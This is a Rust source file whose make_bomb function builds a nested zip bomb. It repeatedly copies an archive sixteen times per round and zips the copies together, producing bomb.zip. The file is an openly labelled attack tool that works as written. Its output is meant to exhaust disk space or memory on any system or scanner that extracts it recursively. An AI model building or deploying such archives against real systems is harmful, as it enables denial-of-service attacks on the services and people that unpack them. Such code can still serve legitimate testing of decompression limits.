use std::fs;
use std::path::Path;
use std::io::prelude::*;
use std::io::{ BufWriter };
use std::env::{ current_dir };
use zip::write::{ FileOptions };
use zip::{ ZipWriter, CompressionMethod };

fn create_sized_empty_file(buffer: &Vec<u8>, dir_path: &str, file_name: &str) -> std::io::Result<String> {
    let file_path = Path::new(dir_path).join(file_name);
    let file = fs::File::create(&file_path)?;
    let mut writer = BufWriter::new(file);
    writer.write(buffer)?;
    
    Ok(file_path.to_str().unwrap().to_string())
}

fn zip_file(str_path_to_data: &str, dir_path: &str, file_name: &str) -> zip::result::ZipResult<String> {
    let mut buffer: Vec<u8> = vec![];
    let path = Path::new(dir_path).join(file_name);
    let file = std::fs::File::create(&path)?;
    let mut zip = ZipWriter::new(file);
    let options = FileOptions::default()
        .compression_method(CompressionMethod::Deflated)
        .unix_permissions(0o755);
    
    let data_path = Path::new(&str_path_to_data);
    if data_path.is_file() {
        let file_name = data_path.file_name().unwrap().to_str().unwrap();
        let mut data_file = fs::File::open(data_path)?;
        data_file.read_to_end(&mut buffer)?;
        zip.start_file(file_name, options)?;
        zip.write_all(&*buffer)?;
    }
    
    zip.finish()?;
    Ok(path.to_str().unwrap().to_string())
}

fn zip_files(dir_path: &str) -> zip::result::ZipResult<()> {
    let path = Path::new(&dir_path).join("temp.zip");
    let tmp_zip_file = std::fs::File::create(&path)?;
    let mut zip = ZipWriter::new(tmp_zip_file);
    let options = FileOptions::default()
        .compression_method(CompressionMethod::Deflated)
        .unix_permissions(0o755);

    for entry in fs::read_dir(Path::new(&dir_path))? {
        let entry = entry?;
        let entry_path = entry.path();
        if !entry_path.is_dir() {
            let mut buffer: Vec<u8> = vec![];
            let name = entry_path.file_name().unwrap().to_str().unwrap();
            let mut data_file = fs::File::open(&entry_path)?;
            data_file.read_to_end(&mut buffer)?;
            zip.start_file(name, options)?;
            zip.write_all(&*buffer)?;
            if name != "temp.zip" { fs::remove_file(&entry_path)?; }
        }
    }
    
    zip.finish()?;
    fs::rename(&path, Path::new(&dir_path).join("0.txt"))?;
    Ok(())
}

fn copy_files_and_return_zip(count: usize, dir_path: &str) -> std::io::Result<()> {
    let start_file = Path::new(&dir_path).join("0.txt");
    for index in 1..count {
        let new_file = Path::new(&dir_path).join(format!("{}.txt", index));
        fs::copy(&start_file, &new_file)?;
        fs::rename(
            &new_file,
            Path::new(&dir_path).join(format!("{}.zip", index))
        )?;
    }

    fs::rename(&start_file, Path::new(&dir_path).join("0.zip"))?;
    Ok(())
}

pub fn create_cwd_path(name: &str) -> String {
    let cwd = current_dir().unwrap();
    let path = cwd.join(name);
    let path_str = path.to_str().unwrap();

    path_str.to_string()
}

pub fn make_bomb(temp_directory: &str, file_name: &str, rounds: u32, buffer: Vec<u8>) -> std::io::Result<()> {
    let temp_directory_path = Path::new(&temp_directory);
    fs::create_dir(temp_directory_path)?;
    
    println!("bomb packing...");
    let temp_file = create_sized_empty_file(&buffer, &temp_directory, "temp_file")?;
    let zip_file = zip_file(&temp_file, &temp_directory, file_name)?;

    fs::remove_file(&temp_file)?;
    fs::rename(&zip_file, Path::new(&temp_directory).join("0.txt"))?;

    for i in 0..rounds {
        println!("round: {}", i);
        let temp_dir_path_str = temp_directory_path.to_str().unwrap();
        copy_files_and_return_zip(16, &temp_dir_path_str)?;
        zip_files(&temp_dir_path_str)?;
    }

    fs::rename(Path::new(&temp_directory).join("0.txt"), Path::new(&temp_directory).join("../bomb.zip"))?;
    fs::remove_dir(&temp_directory)?;
    
    println!("done!");
    Ok(())
}